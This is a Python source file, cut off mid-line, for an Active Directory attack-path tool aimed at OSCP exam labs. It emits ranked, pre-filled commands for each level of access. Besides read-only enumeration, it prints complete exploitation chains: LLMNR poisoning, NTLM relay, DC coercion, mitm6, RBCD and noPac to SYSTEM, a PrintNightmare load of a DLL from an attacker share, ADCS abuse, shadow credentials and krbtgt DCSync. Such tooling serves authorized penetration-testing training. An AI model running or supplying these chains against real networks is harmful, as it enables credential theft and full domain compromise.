#!/usr/bin/env python3
"""
admap - an Active Directory attack-path assistant for OSCP exam labs.

Where ReconX answers "what ports/services are on this box", admap answers the
next question: "given what I now know, what AD attack paths are open, and what
exactly do I run next?". It models the Orange Cyberdefense AD mindmap
(https://orange-cyberdefense.github.io/ocd-mindmaps/) as a state machine keyed
on your current level of access:

    nothing  ->  username(s)  ->  valid creds  ->  local admin  ->  domain dominance

For your state it emits a RANKED playbook of techniques, each with a one-line
rationale, the mindmap branch it comes from, and a copy-paste command with the
target / user / domain already filled in. Techniques are tagged:

    [ENUM]   safe, read-only identification  - can be auto-run with --run
    [SPRAY]  touches auth, lockout risk      - printed, never auto-run
    [MANUAL] exploitation / post-ex / DA     - printed only; you run it

This split mirrors the project rule: automate ENUMERATION, keep EXPLOITATION
and privesc in your own hands. --run only ever fires [ENUM] steps, parses their
output, and uses confirmed results to unlock and re-rank deeper techniques.

Design goals (shared with reconx): stdlib only (Python 3.8+), single file,
every external tool optional with graceful fallback, easy to read and hack
mid-exam.

Ethics: authorized targets only - your own lab, HTB / PG / THM, or the OSCP
exam. This tool identifies paths and runs read-only enumeration; it does not
auto-exploit.

Usage
-----
  # No creds yet - what can I do against the DC at 10.10.10.10?
  admap 10.10.10.10 --anon

  # I have a username list from RID-brute - find spray/AS-REP targets
  admap 10.10.10.10 --domain corp.local --users users.txt

  # I have valid domain creds - full authenticated playbook, and run the
  # read-only enumeration for me:
  admap 10.10.10.10 --domain corp.local -u alex -p 'Passw0rd!' --dc-ip 10.10.10.10 --run

  # Pass-the-hash, and I'm already local admin on this host:
  admap 10.10.10.20 -u admin -H aad3b4...:31d6cf... --local-admin

  # Just print the plan, fill nothing in automatically:
  admap 10.10.10.10 --domain corp.local -u alex -p 'pw' --dry-run

Author: built for the OSCP exam environment. MIT-style, hack freely.
"""

import argparse
import asyncio
import os
import re
import shlex
import shutil
import sys
from datetime import datetime


# --------------------------------------------------------------------------- #
#  Terminal colours (same palette as reconx)
# --------------------------------------------------------------------------- #
class C:
    R = "\033[31m"; G = "\033[32m"; Y = "\033[33m"; B = "\033[34m"
    M = "\033[35m"; CY = "\033[36m"; W = "\033[37m"; GR = "\033[90m"
    BOLD = "\033[1m"; DIM = "\033[2m"; END = "\033[0m"

    @classmethod
    def strip(cls):
        for k in list(vars(cls)):
            v = getattr(cls, k)
            if not k.startswith("_") and isinstance(v, str) and v.startswith("\033"):
                setattr(cls, k, "")


def ts():
    return datetime.now().strftime("%H:%M:%S")


def info(msg):  print(f"{C.GR}[{ts()}]{C.END} {C.B}[*]{C.END} {msg}")
def good(msg):  print(f"{C.GR}[{ts()}]{C.END} {C.G}[+]{C.END} {msg}")
def warn(msg):  print(f"{C.GR}[{ts()}]{C.END} {C.Y}[!]{C.END} {msg}")
def bad(msg):   print(f"{C.GR}[{ts()}]{C.END} {C.R}[-]{C.END} {msg}")


# --------------------------------------------------------------------------- #
#  Technique classes - how a step is allowed to run
# --------------------------------------------------------------------------- #
ENUM   = "ENUM"      # read-only identification; eligible for --run
SPRAY  = "SPRAY"     # touches authentication, lockout risk; printed only
MANUAL = "MANUAL"    # exploitation / post-ex / domain dominance; printed only

KIND_COLOR = {ENUM: C.CY, SPRAY: C.Y, MANUAL: C.M}

# Priority buckets drive ordering within a phase (lower = look first).
PRIO_COLOR = {0: C.R + C.BOLD, 1: C.R, 2: C.Y, 3: C.CY}


# --------------------------------------------------------------------------- #
#  Tool detection - every external tool is optional
# --------------------------------------------------------------------------- #
def _first(*names):
    for n in names:
        if shutil.which(n):
            return n
    return None


def nxc_bin():
    return _first("nxc", "netexec", "crackmapexec")


def impacket(name):
    """Return the runnable form of an impacket example script, or None.
    Kali ships them as `impacket-GetNPUsers`; pip installs as `GetNPUsers.py`."""
    return _first(f"impacket-{name}", f"{name}.py")


TOOL_CACHE = {}


def have(tool):
    if tool not in TOOL_CACHE:
        TOOL_CACHE[tool] = shutil.which(tool) is not None
    return TOOL_CACHE[tool]


# --------------------------------------------------------------------------- #
#  State - what we currently know / hold
# --------------------------------------------------------------------------- #
class State:
    """Everything admap knows about the engagement, derived from argv and then
    mutated as --run confirms things (e.g. a spray lands -> have_creds)."""

    def __init__(self, args):
        self.target = args.target                      # DC or member host IP/host
        self.dc_ip = args.dc_ip or args.target
        self.domain = args.domain
        self.user = args.user
        self.password = args.password
        self.hash = args.hash
        self.users_file = args.users
        self.local_auth = args.local_auth

        # Access level flags
        self.anon = args.anon
        self.local_admin = args.local_admin
        self.domain_admin = args.domain_admin

        # Derived facts discovered during --run
        self.facts = set()          # free-form tags e.g. "smb_signing_off"
        self.notes = []             # (tag, text) learned at runtime

    # --- predicates the technique catalog keys on --------------------------- #
    @property
    def have_creds(self):
        return bool(self.user and (self.password or self.hash))

    @property
    def have_username(self):
        return bool(self.user or self.users_file)

    @property
    def is_pth(self):
        return bool(self.hash)

    def secret_flag(self):
        """netexec/impacket secret argument for the held credential."""
        if self.hash:
            return f"-H {shlex.quote(self.hash)}"
        if self.password is not None:
            return f"-p {shlex.quote(self.password)}"
        return ""

    def nxc_auth(self):
        parts = [f"-u {shlex.quote(self.user)}"] if self.user else []
        s = self.secret_flag()
        if s:
            parts.append(s)
        if self.domain and not self.local_auth:
            parts.append(f"-d {shlex.quote(self.domain)}")
        if self.local_auth:
            parts.append("--local-auth")
        return " ".join(parts)

    def impacket_target(self):
        """domain/user:pass@host  (or domain/user@host -hashes LM:NT for PtH).

        The positional target is a single shell token, so it is shlex.quoted
        as a whole: a plain target (chars / : . @ - are shell-safe) is left
        untouched, while a password with spaces or metacharacters is quoted so
        the printed command and --run stay correct.
        """
        dom = f"{self.domain}/" if self.domain else ""
        u = self.user or "<user>"
        if self.hash:
            return f"{shlex.quote(f'{dom}{u}@{self.target}')} -hashes {shlex.quote(self.hash)}"
        pw = self.password if self.password is not None else "<pass>"
        return shlex.quote(f"{dom}{u}:{pw}@{self.target}")

    def certipy_secret(self):
        """Certipy's credential flag: -p <pass> or -hashes <nt>."""
        if self.hash:
            return f"-hashes {shlex.quote(self.hash)}"
        if self.password is not None:
            return f"-p {shlex.quote(self.password)}"
        return "-p <pass>"

    def level(self):
        if self.domain_admin:
            return "domain dominance"
        if self.local_admin:
            return "local admin"
        if self.have_creds:
            return "valid credentials"
        if self.have_username:
            return "username(s) only"
        return "no credentials"


# --------------------------------------------------------------------------- #
#  Technique catalog
# --------------------------------------------------------------------------- #
class Tech:
    """One mindmap node: a technique with preconditions and a command.

    `when(state)`  -> bool : is this path open given current access?
    `cmd(state)`   -> str  : the filled-in command (or None if tool missing)
    `prio`         : 0..3, lower surfaces first inside a phase.
    `kind`         : ENUM / SPRAY / MANUAL - gates --run.
    `branch`       : the mindmap branch this belongs to (for the reference).
    """

    def __init__(self, tid, phase, name, kind, prio, branch, why, when, cmd,
                 tool=None, success=None):
        self.tid = tid
        self.phase = phase
        self.name = name
        self.kind = kind
        self.prio = prio
        self.branch = branch
        self.why = why
        self._when = when
        self._cmd = cmd
        self.tool = tool            # external tool required (for availability note)
        self.success = success      # regex marking a confirmed hit in output

    def applies(self, st):
        return self._when(st)

    def command(self, st):
        try:
            return self._cmd(st)
        except Exception:
            return None

    def tool_ok(self):
        return self.tool is None or have(self.tool)


# Phase labels mirror the mindmap's "starting knowledge" spine.
P_FOOTHOLD = "0. No creds  (foothold / outsider)"
P_USER     = "1. Username(s) known"
P_CREDS    = "2. Valid domain credentials"
P_ADMIN    = "3. Local admin on a host"
P_DOMAIN   = "4. Domain dominance"


def build_catalog():
    """Return the ordered list of Tech nodes. Commands are lambdas over State
    so they fill in live target/user/domain values. Keep each command to the
    canonical OSCP-lab form."""
    nxc = nxc_bin() or "nxc"
    cat = []
    A = cat.append

    # -- helpers for command construction ---------------------------------- #
    def dcflag(st):
        return f"-dc-ip {st.dc_ip}" if st.dc_ip else ""

    # ===================================================================== #
    #  PHASE 0 - no credentials (outsider against the domain)
    # ===================================================================== #
    A(Tech("smb-null", P_FOOTHOLD, "SMB null session - shares & users", ENUM, 0,
           "No creds > SMB > null session",
           "Null auth often exposes shares, the password policy, and the user list.",
           lambda st: True,
           lambda st: f"{nxc} smb {st.target} -u '' -p '' --shares --users --pass-pol",
           tool=nxc_bin(),
           success=re.compile(r"\[\+\]|READ|WRITE|-Users-|Enumerated", re.I)))

    A(Tech("smb-guest", P_FOOTHOLD, "SMB guest session - shares", ENUM, 1,
           "No creds > SMB > guest account",
           "When null is blocked, the 'guest' account is frequently still enabled.",
           lambda st: True,
           lambda st: f"{nxc} smb {st.target} -u 'guest' -p '' --shares",
           tool=nxc_bin(),
           success=re.compile(r"\[\+\]|READ|WRITE", re.I)))

    A(Tech("rid-brute", P_FOOTHOLD, "RID-brute to harvest usernames", ENUM, 0,
           "No creds > SMB/LSA > RID cycling",
           "Turns an anonymous bind into a full domain user list -> spray/AS-REP targets.",
           lambda st: True,
           lambda st: f"{nxc} smb {st.target} -u '' -p '' --rid-brute 10000",
           tool=nxc_bin(),
           success=re.compile(r"SidTypeUser|\\\\", re.I)))

    A(Tech("ldap-anon", P_FOOTHOLD, "LDAP anonymous bind - dump naming context", ENUM, 1,
           "No creds > LDAP > anonymous bind",
           "Anonymous LDAP can leak users, descriptions (passwords!), and the domain policy.",
           lambda st: True,
           lambda st: (f"ldapsearch -x -H ldap://{st.target} -s base namingcontexts ; "
                       f"ldapsearch -x -H ldap://{st.target} -b \"{domain_dn(st)}\" "
                       f"\"(objectClass=user)\" sAMAccountName description"),
           tool="ldapsearch",
           success=re.compile(r"sAMAccountName|description", re.I)))

    A(Tech("enum4linux", P_FOOTHOLD, "enum4linux-ng sweep", ENUM, 2,
           "No creds > SMB/RPC > automated null enum",
           "One-shot null/guest sweep: OS, shares, users, groups, pass-pol, RID range.",
           lambda st: True,
           lambda st: f"enum4linux-ng -A {st.target}",
           tool=_first("enum4linux-ng", "enum4linux")))

    A(Tech("rpc-null", P_FOOTHOLD, "rpcclient null bind - enumdomusers", ENUM, 2,
           "No creds > RPC > null session",
           "enumdomusers / querydispinfo over a null RPC bind is another path to the user list.",
           lambda st: True,
           lambda st: (f"rpcclient -U '' -N {st.target} "
                       f"-c 'enumdomusers;enumdomgroups;querydominfo'"),
           tool="rpcclient"))

    A(Tech("dns-srv", P_FOOTHOLD, "Resolve DC / domain via SRV + reverse", ENUM, 3,
           "No creds > DNS > SRV records",
           "Confirms the domain name and DC hostnames you need for Kerberos-based attacks.",
           lambda st: True,
           lambda st: (f"nslookup -type=SRV _ldap._tcp.dc._msdcs.{st.domain or '<domain>'} {st.dc_ip} ; "
                       f"nslookup {st.target}"),
           tool="nslookup"))

    A(Tech("asrep-nopreauth", P_FOOTHOLD, "AS-REP roast a username list (no creds)", ENUM, 1,
           "No creds > Kerberos > AS-REP roasting",
           "Any user with 'Do not require Kerberos preauth' yields a crackable hash with zero creds.",
           lambda st: st.have_username,
           lambda st: (f"{impacket('GetNPUsers') or 'impacket-GetNPUsers'} "
                       f"{getnpusers_target(st)} -no-pass "
                       f"{dcflag(st)} -format hashcat -outputfile asrep.hashes"),
           tool=impacket("GetNPUsers"),
           success=re.compile(r"\$krb5asrep\$", re.I)))

    A(Tech("kerbrute-enum", P_FOOTHOLD, "kerbrute userenum (stealth, no lockout)", ENUM, 2,
           "No creds > Kerberos > username validation",
           "Validates which guessed/harvested usernames exist, via Kerberos pre-auth, without failed logons.",
           lambda st: st.have_username,
           lambda st: kerbrute_cmd(st),
           tool="kerbrute"))

    A(Tech("pre2k", P_FOOTHOLD, "pre-Windows-2000 computer accounts", ENUM, 3,
           "No creds > Kerberos > pre2k machine accounts",
           "Legacy machine accounts whose password == lowercase hostname give an authenticated foothold.",
           lambda st: True,
           lambda st: f"pre2k unauth -d {st.domain or '<domain>'} -dc-ip {st.dc_ip}",
           tool="pre2k"))

    # Outsider exploitation - printed only (poisoning / relay / coercion)
    A(Tech("responder", P_FOOTHOLD, "Responder - poison LLMNR/NBT-NS/mDNS", MANUAL, 1,
           "No creds > MITM > name-resolution poisoning",
           "Capture NetNTLMv2 hashes from broadcast name resolution, then crack or relay them.",
           lambda st: True,
           lambda st: "sudo responder -I tun0 -wv        # then crack with hashcat -m 5600",
           tool="responder"))

    A(Tech("ntlmrelay", P_FOOTHOLD, "ntlmrelayx - relay to SMB/LDAP/ADCS", MANUAL, 1,
           "No creds > MITM > NTLM relay",
           "If SMB signing is not required, relay captured/coerced auth to a target you don't hold creds for.",
           lambda st: True,
           lambda st: (f"{impacket('ntlmrelayx') or 'impacket-ntlmrelayx'} -tf targets.txt "
                       f"-smb2support            # add --delegate-access / -t ldaps://DC for RBCD/ADCS"),
           tool=impacket("ntlmrelayx")))

    A(Tech("coerce", P_FOOTHOLD, "Coerce DC auth (PetitPotam / Coercer)", MANUAL, 2,
           "No creds > Coercion > force DC authentication",
           "Force the DC to authenticate to your relay (pairs with ntlmrelayx -> ADCS ESC8 / RBCD).",
           lambda st: True,
           lambda st: f"coercer coerce -t {st.dc_ip} -l <attacker-ip>   # or PetitPotam.py",
           tool=_first("coercer", "PetitPotam.py")))

    A(Tech("mitm6", P_FOOTHOLD, "mitm6 - IPv6 DHCPv6/DNS takeover -> relay", MANUAL, 2,
           "No creds > MITM > IPv6 (DHCPv6 preferred over IPv4)",
           "Windows prefers IPv6: spoof DHCPv6 + WPAD to become the victims' DNS, then relay the "
           "coerced auth to LDAPS to add a computer / grant RBCD.",
           lambda st: True,
           lambda st: (
               f"mitm6 -d {st.domain or '<dom>'} -i tun0\n"
               f"{impacket('ntlmrelayx') or 'impacket-ntlmrelayx'} -6 -t ldaps://{st.dc_ip} "
               f"-wh fakewpad.{st.domain or '<dom>'} --delegate-access -smb2support"),
           tool="mitm6"))

    # ===================================================================== #
    #  PHASE 1 - username(s) known
    # ===================================================================== #
    A(Tech("pass-pol", P_USER, "Read password policy before spraying", ENUM, 0,
           "Username > recon > lockout policy",
           "Know the lockout threshold/window FIRST so a spray doesn't lock out the domain.",
           lambda st: st.have_username and not st.have_creds,
           lambda st: f"{nxc} smb {st.target} -u '' -p '' --pass-pol",
           tool=nxc_bin()))

    A(Tech("spray", P_USER, "Password spray (lockout-aware)", SPRAY, 1,
           "Username > guessing > password spraying",
           "One password across all users. Honour the lockout policy - 1 try/user/window.",
           lambda st: st.have_username and not st.have_creds,
           lambda st: (f"{nxc} smb {st.target} -u {userlist(st)} -p <Season><Year>! "
                       f"--continue-on-success           # e.g. Autumn2025! / <Company>1"),
           tool=nxc_bin()))

    A(Tech("asrep-user", P_USER, "AS-REP roast known users", ENUM, 1,
           "Username > Kerberos > AS-REP roasting",
           "No password needed; crack offline with hashcat -m 18200.",
           lambda st: st.have_username and not st.have_creds,
           lambda st: (f"{impacket('GetNPUsers') or 'impacket-GetNPUsers'} "
                       f"{getnpusers_target(st)} -no-pass "
                       f"{dcflag(st)} -format hashcat"),
           tool=impacket("GetNPUsers"),
           success=re.compile(r"\$krb5asrep\$", re.I)))

    # ===================================================================== #
    #  PHASE 2 - valid domain credentials
    # ===================================================================== #
    A(Tech("cred-validate", P_CREDS, "Validate creds + check for admin (Pwn3d!)", ENUM, 0,
           "Creds > validation > where am I local admin?",
           "Confirms the creds and immediately shows every host where they're admin ((Pwn3d!)).",
           lambda st: st.have_creds,
           lambda st: f"{nxc} smb {st.target} {st.nxc_auth()}",
           tool=nxc_bin(),
           success=re.compile(r"\[\+\]|Pwn3d", re.I)))

    A(Tech("bloodhound", P_CREDS, "BloodHound collection - map the graph", ENUM, 0,
           "Creds > enumeration > BloodHound",
           "The single highest-value step: collects ACLs, sessions, delegations -> shortest path to DA.",
           lambda st: st.have_creds,
           lambda st: bloodhound_cmd(st),
           tool=_first("bloodhound-python", "bloodhound-ce-python"),
           success=re.compile(r"Done|compressing|finished", re.I)))

    A(Tech("kerberoast", P_CREDS, "Kerberoast - roast service accounts", ENUM, 1,
           "Creds > Kerberos > Kerberoasting",
           "Any SPN-bearing account yields a crackable TGS (hashcat -m 13100). Classic OSCP win.",
           lambda st: st.have_creds,
           lambda st: (f"{impacket('GetUserSPNs') or 'impacket-GetUserSPNs'} "
                       f"{st.impacket_target_noat()} -request {dcflag(st)} "
                       f"-outputfile kerberoast.hashes"),
           tool=impacket("GetUserSPNs"),
           success=re.compile(r"\$krb5tgs\$", re.I)))

    A(Tech("asrep-authed", P_CREDS, "AS-REP roast (authenticated, whole domain)", ENUM, 1,
           "Creds > Kerberos > AS-REP roasting",
           "With creds you can enumerate every DONT_REQ_PREAUTH account at once.",
           lambda st: st.have_creds,
           lambda st: (f"{impacket('GetNPUsers') or 'impacket-GetNPUsers'} "
                       f"{st.impacket_target_noat()} -request {dcflag(st)} -format hashcat"),
           tool=impacket("GetNPUsers"),
           success=re.compile(r"\$krb5asrep\$", re.I)))

    A(Tech("shares", P_CREDS, "Spider readable shares for secrets", ENUM, 1,
           "Creds > SMB > share spidering",
           "Authenticated share access hides creds in scripts, configs, and backups.",
           lambda st: st.have_creds,
           lambda st: f"{nxc} smb {st.target} {st.nxc_auth()} --shares -M spider_plus",
           tool=nxc_bin(),
           success=re.compile(r"READ|WRITE", re.I)))

    A(Tech("gpp", P_CREDS, "GPP cpassword in SYSVOL", ENUM, 1,
           "Creds > SMB > SYSVOL / GPP passwords",
           "Group Policy Preferences store an AES-encrypted-with-a-public-key password = instant creds.",
           lambda st: st.have_creds,
           lambda st: f"{nxc} smb {st.target} {st.nxc_auth()} -M gpp_password -M gpp_autologin",
           tool=nxc_bin(),
           success=re.compile(r"password|cpassword|Found", re.I)))

    A(Tech("ldap-enum", P_CREDS, "LDAP property enum (delegation / descriptions)", ENUM, 1,
           "Creds > LDAP > object property mining",
           "Finds unconstrained/constrained delegation, passwords-in-description, AS-REP/SPN flags.",
           lambda st: st.have_creds,
           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} "
                       f"--trusted-for-delegation --password-not-required "
                       f"--admin-count --users"),
           tool=nxc_bin()))

    A(Tech("laps", P_CREDS, "Read LAPS local-admin passwords", ENUM, 1,
           "Creds > LDAP > ms-Mcs-AdmPwd / Windows LAPS",
           "Any principal with the LAPS read right gets a machine's local Administrator password in "
           "cleartext - instant local admin, and often the same reader covers many hosts.",
           lambda st: st.have_creds,
           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M laps   # legacy ms-Mcs-AdmPwd + Windows LAPS",
           tool=nxc_bin(),
           # Require a recovered value (label + ':'/'=' + a real secret), not the
           # bare words "Password"/"Administrator" - those appear in nxc's status
           # lines and benign LDAP fields ("Password Last Set:", a computer owner)
           # and falsely "confirmed" LAPS with nothing read. Mirrors reconx's rule.
           success=re.compile(r"(ms-?Mcs-?AdmPwd|LAPS|Password|Administrator)\s*[:=]\s*\S{6,}", re.I)))

    A(Tech("gmsa", P_CREDS, "Read gMSA managed passwords", ENUM, 1,
           "Creds > LDAP > msDS-ManagedPassword / gMSA",
           "If you (or a group you're in) are on a gMSA's PrincipalsAllowedToRetrieveManagedPassword, "
           "you can read its NT hash and act as that - frequently high-privileged - service account.",
           lambda st: st.have_creds,
           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} --gmsa\n"
                       f"# alt: gMSADumper.py -u {st.user or '<me>'} {st.secret_flag() or '-p <pw>'} "
                       f"-d {st.domain or '<dom>'} -l {st.dc_ip}"),
           tool=nxc_bin(),
           success=re.compile(r"ManagedPassword|gMSA|Account:|NTLM", re.I)))

    A(Tech("adcs-find", P_CREDS, "Certipy - find vulnerable cert templates (ESC1-16)", ENUM, 0,
           "Creds > ADCS > template enumeration",
           "AD CS misconfigs (ESC1/ESC8...) are a reliable domain-takeover path - enumerate first.",
           lambda st: st.have_creds,
           lambda st: (f"certipy find -u {st.user or '<user>'}@{st.domain or '<domain>'} "
                       f"{st.certipy_secret()} "
                       f"-dc-ip {st.dc_ip} -vulnerable -stdout"),
           tool="certipy",
           success=re.compile(r"ESC\d+|Vulnerable", re.I)))

    A(Tech("delegation", P_CREDS, "Enumerate Kerberos delegation", ENUM, 1,
           "Creds > Kerberos > delegation abuse",
           "Unconstrained / constrained / RBCD each give a distinct escalation path.",
           lambda st: st.have_creds,
           lambda st: (f"{impacket('findDelegation') or 'impacket-findDelegation'} "
                       f"{st.impacket_target_noat()} {dcflag(st)}"),
           tool=impacket("findDelegation"),
           success=re.compile(r"Unconstrained|Constrained|RBCD", re.I)))

    A(Tech("trust-enum", P_CREDS, "Enumerate domain / forest trusts", ENUM, 2,
           "Creds > LDAP > trustedDomain objects",
           "Trusts open escalation to other domains - map them early; a child->parent edge is a "
           "reliable route to Enterprise Admin.",
           lambda st: st.have_creds,
           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} "
                       f"--query \"(objectClass=trustedDomain)\" "
                       f"\"flatName trustPartner trustDirection trustType trustAttributes\""),
           tool=nxc_bin(),
           success=re.compile(r"trust|Parent|Child|Forest", re.I)))

    # Phase 2 exploitation - printed only
    A(Tech("crack", P_CREDS, "Crack roasted hashes offline", MANUAL, 1,
           "Creds > offline > hashcat",
           "Crack the AS-REP/TGS loot you collected; no interaction with the target.",
           lambda st: st.have_creds,
           lambda st: ("hashcat -m 13100 kerberoast.hashes rockyou.txt   # TGS (Kerberoast)\n"
                       "hashcat -m 18200 asrep.hashes      rockyou.txt   # AS-REP"),
           tool="hashcat"))

    A(Tech("acl-abuse", P_CREDS, "Abuse an ACL edge from BloodHound", MANUAL, 2,
           "Creds > ACL > GenericAll / WriteDACL / ...",
           "Follow the shortest BloodHound path: ForceChangePassword, targeted Kerberoast, AddMember, etc.",
           lambda st: st.have_creds,
           lambda st: ("# examples - pick per BloodHound edge:\n"
                       "bloodyAD --host <dc> -d <dom> -u <me> -p <pw> set password <victim> 'New!Pass1'\n"
                       "net rpc password <victim> 'New!Pass1' -U <dom>/<me>%<pw> -S <dc>\n"
                       "targetedKerberoast.py -d <dom> -u <me> -p <pw>   # via GenericWrite"),
           tool=None))

    A(Tech("shadow-cred", P_CREDS, "Shadow Credentials (msDS-KeyCredentialLink)", MANUAL, 1,
           "Creds > ACL > AddKeyCredentialLink -> PKINIT",
           "With GenericWrite/GenericAll/AddKeyCredentialLink over a user or computer (from "
           "BloodHound), add a key credential, then PKINIT for a TGT and the account's NT hash - "
           "no password reset, and it's quietly reversible.",
           lambda st: st.have_creds,
           lambda st: (
               f"certipy shadow auto -u {st.user or '<me>'}@{st.domain or '<dom>'} "
               f"{st.certipy_secret()} -account '<target_user_or_computer$>' -dc-ip {st.dc_ip}\n"
               "# manual chain (pywhisker + PKINITtools):\n"
               "pywhisker.py -d <dom> -u <me> -p <pw> --target '<target>' --action add\n"
               "gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pw> <dom>/<target> t.ccache\n"
               "getnthash.py -key <as-rep-key> <dom>/<target>   # UnPAC-the-hash -> NT hash"),
           tool="certipy"))

    A(Tech("adcs-exploit", P_CREDS, "Exploit an ADCS template (ESC1 etc.)", MANUAL, 1,
           "Creds > ADCS > request-as / relay",
           "Request a cert as a privileged user, then auth with it for a TGT / NT hash.",
           lambda st: st.have_creds,
           lambda st: ("certipy req -u <me>@<dom> -p <pw> -ca <CA> -template <vuln> -upn administrator@<dom> -dc-ip <dc>\n"
                       "certipy auth -pfx administrator.pfx -dc-ip <dc>     # -> TGT + NT hash"),
           tool="certipy"))

    A(Tech("pass-the-cert", P_CREDS, "Pass-the-Certificate (auth with a PFX)", MANUAL, 2,
           "Creds > ADCS > PKINIT with an existing certificate",
           "Already hold a certificate (from ESC, shadow creds, or loot)? Authenticate with it for a "
           "TGT and the account's NT hash - works even when the password/hash is unknown.",
           lambda st: st.have_creds,
           lambda st: (
               f"certipy auth -pfx <cert.pfx> -dc-ip {st.dc_ip}            # -> TGT + NT hash\n"
               "# key-only (PKINITtools):\n"
               "gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <pw> "
               f"{st.domain or '<dom>'}/<user> out.ccache\n"
               "getnthash.py -key <as-rep-key> "
               f"{st.domain or '<dom>'}/<user>   # UnPAC-the-hash"),
           tool="certipy"))

    A(Tech("maq", P_CREDS, "Read MachineAccountQuota (gates RBCD / noPac)", ENUM, 2,
           "Creds > LDAP > ms-DS-MachineAccountQuota",
           "If MAQ > 0 any user can add a computer account - the pivot both RBCD and noPac rely on.",
           lambda st: st.have_creds,
           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M maq",
           tool=nxc_bin(),
           success=re.compile(r"MachineAccountQuota", re.I)))

    A(Tech("rbcd", P_CREDS, "Resource-Based Constrained Delegation abuse", MANUAL, 1,
           "Creds > Kerberos > RBCD (write over a computer + MAQ>0)",
           "With GenericWrite/GenericAll over a computer (from BloodHound) and MAQ>0: add a "
           "machine, set RBCD, then getST a CIFS ticket as Administrator -> SYSTEM on that host.",
           lambda st: st.have_creds,
           lambda st: (
               f"{impacket('addcomputer') or 'impacket-addcomputer'} "
               f"{st.impacket_target_noat()} -computer-name 'EVIL$' -computer-pass 'Evil1234!' {dcflag(st)}\n"
               f"{impacket('rbcd') or 'impacket-rbcd'} -delegate-from 'EVIL$' "
               f"-delegate-to '<TARGET$>' -action write {st.impacket_target_noat()} {dcflag(st)}\n"
               f"{impacket('getST') or 'impacket-getST'} -spn cifs/<target.fqdn> "
               f"-impersonate administrator {dcflag(st)} {st.domain or '<dom>'}/EVIL\\$:'Evil1234!'\n"
               "export KRB5CCNAME=administrator.ccache\n"
               f"{impacket('psexec') or 'impacket-psexec'} -k -no-pass <target.fqdn>"),
           tool=impacket("rbcd")))

    A(Tech("unconstrained", P_CREDS, "Abuse unconstrained delegation (capture a DC TGT)", MANUAL, 2,
           "Creds > Kerberos > unconstrained delegation",
           "If you control a host trusted for unconstrained delegation, coerce a DC to authenticate "
           "to it; the DC's TGT lands in that host's memory -> extract it and DCSync.",
           lambda st: st.have_creds,
           lambda st: (
               "# on the unconstrained host, watch for inbound TGTs:\n"
               "Rubeus.exe monitor /interval:5 /nowrap\n"
               "# coerce the DC to authenticate to that host:\n"
               f"printerbug.py {st.impacket_target_noat()}@<dc> <unconstrained_host>\n"
               "# reuse the captured DC$ TGT, then DCSync:\n"
               "Rubeus.exe ptt /ticket:<b64>   #  mimikatz lsadump::dcsync /user:<dom>\\krbtgt"),
           tool=None))

    A(Tech("constrained", P_CREDS, "Abuse constrained delegation (S4U getST)", MANUAL, 2,
           "Creds > Kerberos > constrained delegation (S4U2Self/Proxy)",
           "If your account has msDS-AllowedToDelegateTo set, S4U2Self+S4U2Proxy gets a service "
           "ticket to the allowed SPN as any user (e.g. Administrator); -altservice swaps to another "
           "service (e.g. cifs) on the same host.",
           lambda st: st.have_creds,
           lambda st: (
               f"{impacket('getST') or 'impacket-getST'} -spn <allowed_spn>/<target.fqdn> "
               f"-impersonate administrator {dcflag(st)} {st.impacket_target_noat()}\n"
               "# swap the target service (same host) with -altservice:\n"
               f"{impacket('getST') or 'impacket-getST'} -spn <allowed_spn> -altservice cifs "
               f"-impersonate administrator {dcflag(st)} {st.impacket_target_noat()}\n"
               "export KRB5CCNAME=administrator.ccache\n"
               f"{impacket('psexec') or 'impacket-psexec'} -k -no-pass <target.fqdn>"),
           tool=impacket("getST")))

    A(Tech("nopac", P_CREDS, "noPac - sAMAccountName spoofing (CVE-2021-42278/42287)", MANUAL, 1,
           "Creds > Kerberos > noPac (MAQ > 0, unpatched DC)",
           "Any valid account + MAQ>0 against an unpatched DC -> impersonate a DC -> SYSTEM. "
           "Check the nxc module first; it's patch-dependent but common in labs.",
           lambda st: st.have_creds,
           lambda st: (
               f"{nxc} smb {st.dc_ip} {st.nxc_auth()} -M nopac          # detection\n"
               f"noPac.py {st.impacket_target_noat()} -dc-ip {st.dc_ip} -dc-host <dc-hostname> "
               "--impersonate administrator -use-ldap -shell\n"
               "# or dump instead of shell:  ... -dump -just-dc-user <dom>/krbtgt"),
           tool=None))

    A(Tech("print-abuse", P_CREDS, "PrintNightmare / PrintSpoofer -> SYSTEM", MANUAL, 2,
           "Creds > Spooler > CVE-2021-1675/34527 (remote) or SeImpersonate (local)",
           "A vulnerable Print Spooler is a dependable SYSTEM path: PrintNightmare runs a DLL as a "
           "domain user over RPC; PrintSpoofer/potatoes abuse SeImpersonate once you have a service "
           "shell on the box.",
           lambda st: st.have_creds,
           lambda st: (
               f"{nxc} smb {st.target} {st.nxc_auth()} -M printnightmare   # detection scan\n"
               "# remote (domain user -> SYSTEM via malicious DLL on a share):\n"
               f"printnightmare.py {st.impacket_target_noat()}@{st.target} "
               "-dll '\\\\<attacker>\\share\\add_user.dll'\n"
               "# local (you already have a SeImpersonate service shell):\n"
               "PrintSpoofer64.exe -i -c cmd      # or GodPotato / JuicyPotatoNG"),
           tool=None))

    A(Tech("mssql-enum", P_CREDS, "MSSQL access, privileges & linked servers", ENUM, 1,
           "Creds > MSSQL > access / impersonation / trusted links",
           "Domain creds frequently log into MSSQL; check for sysadmin, EXECUTE AS impersonation, "
           "and linked servers you can hop with EXECUTE AT - all classic AD pivots.",
           lambda st: st.have_creds,
           lambda st: f"{nxc} mssql {st.target} {st.nxc_auth()} -M enum_impersonate",
           tool=nxc_bin(),
           success=re.compile(r"\[\+\]|sysadmin|Pwn3d|Linked", re.I)))

    A(Tech("mssql-exec", P_CREDS, "MSSQL -> RCE (xp_cmdshell / impersonation / links)", MANUAL, 1,
           "Creds > MSSQL > command execution",
           "Turn MSSQL access into a shell: enable xp_cmdshell, impersonate a sysadmin login, "
           "or pivot across a trusted linked server with EXECUTE AT.",
           lambda st: st.have_creds,
           lambda st: (
               f"{impacket('mssqlclient') or 'impacket-mssqlclient'} {st.impacket_target()} -windows-auth\n"
               "# then, inside the SQL shell:\n"
